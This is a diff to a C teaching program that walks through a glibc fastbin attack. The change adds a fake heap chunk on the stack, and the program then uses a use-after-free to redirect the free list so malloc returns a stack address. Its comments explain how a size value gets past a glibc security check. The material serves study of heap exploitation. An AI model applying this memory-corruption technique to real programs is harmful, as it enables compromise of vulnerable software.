@@ -2,6 +2,17 @@
 #include <string.h>
 #include <stdlib.h>
 
+/*
+Structure for creating fake chunks
+*/
+struct malloc_chunk {
+	long prev_size; // The prev_size is only used if the previous chunk is free.
+	long size;      // The size of the current chunk. The first three bits are used for flags for GLibC
+	struct malloc_chunk* fd; 
+	struct malloc_chunk* bk;
+};
+
+
 int main(void)
 {
     puts("Today we will be discussing a fastbin attack.");
@@ -26,12 +37,18 @@ int main(void)
     printf("Chunk 2: %p\n\n", ptr2);
 
 
-    printf("Next we will make an integer variable on the stack. Our goal will be to allocate a chunk to this variable (because why not).\n");
+    printf("Next make a fake chunk on the stack. Our goal will be to allocate a chunk to this variable (because why not).\n");
 
-    int stackVar = 0x55;
+    struct malloc_chunk my_chunk;
+    my_chunk.prev_size = 0x0; // Does not matter, for our concern 
+    my_chunk.size = 0x41; // 0x40 will fit in the bin that we are allocating too. Additionally, we set the PREV_INUSE in order avoid additional checks with the prev_size field
+    my_chunk.fd = 0x0; // fd ptr 
+    my_chunk.bk = 0x0; // bk ptr
 
-    printf("Integer: %x\t @: %p\n\n", stackVar, &stackVar);
+    printf("Chunk Info: prev_size: %ld, size: %ld, forward ptr: %p, forward ptr %p, Address of Fake chunk: %p\n\n", my_chunk.prev_size, my_chunk.size, my_chunk.fd, my_chunk.bk, &my_chunk);
 
+    printf("We set the size to 0x41 because 0x40 is the same bin that the other malloced chunks are in.\n This bypasses a security check in newer versions of GLibC"); 
+    printf("Set the PREV_INUSE bit (bit 0) in order to avoid dealing with chunks in reverse and the PREV_SIZE field");
     printf("Proceeding that I'm going to write just some data to the three heap chunks\n");
 
     char *data0 = "00000000";
@@ -64,12 +81,12 @@ int main(void)
     printf("Now we will edit a freed chunk (specifically the second chunk \"Chunk 1\"). We will be doing it with a use after free, since after we freed it we didn't get rid of the pointer.\n");
     printf("We will edit it so the next pointer points to the address of the stack integer variable we talked about earlier. This way when we allocate this chunk, it will put our fake chunk (which points to the stack integer) on top of the free list.\n\n");
 
-    *ptr1 = (unsigned long)((char *)&stackVar);
+    *ptr1 = (unsigned long)((char *)&my_chunk);
 
     printf("We can see it's new value of Chunk1 @ %p\t hold: 0x%lx\n\n", ptr1, *ptr1);
 
 
-    printf("Now we will allocate three new chunks. The first one will pretty much be a normal chunk. The second one is the chunk which the next pointer we overwrote with the pointer to the stack variable.\n");
+    printf("Now we will allocate three new chunks. The first one will pretty much be a normal chunk. The second one is the chunk which the next pointer we overwrote with the pointer to the stack variable. It should be noted that the fastbin is LIFO (last in first out).\n");
     printf("When we allocate that chunk, our fake chunk will be at the top of the fastbin. Then we can just allocate one more chunk from that fastbin to get malloc to return a pointer to the stack variable.\n\n");
 
     unsigned long *ptr3, *ptr4, *ptr5;
@@ -80,7 +97,9 @@ int main(void)
 
     printf("Chunk 3: %p\n", ptr3);
     printf("Chunk 4: %p\n", ptr4);
-    printf("Chunk 5: %p\t Contains: 0x%x\n", ptr5, (int)*ptr5);
+    printf("Chunk 5: %p\t", ptr5);
 
+    printf("NOTICE: The stack variable, that we assigned earlier, is the same as the chunk 5 pointer, just 0x10 more because of the metadata at the beginning\n");
     printf("\n\nJust like that, we executed a fastbin attack to allocate an address to a stack variable using malloc!\n");
 }
+
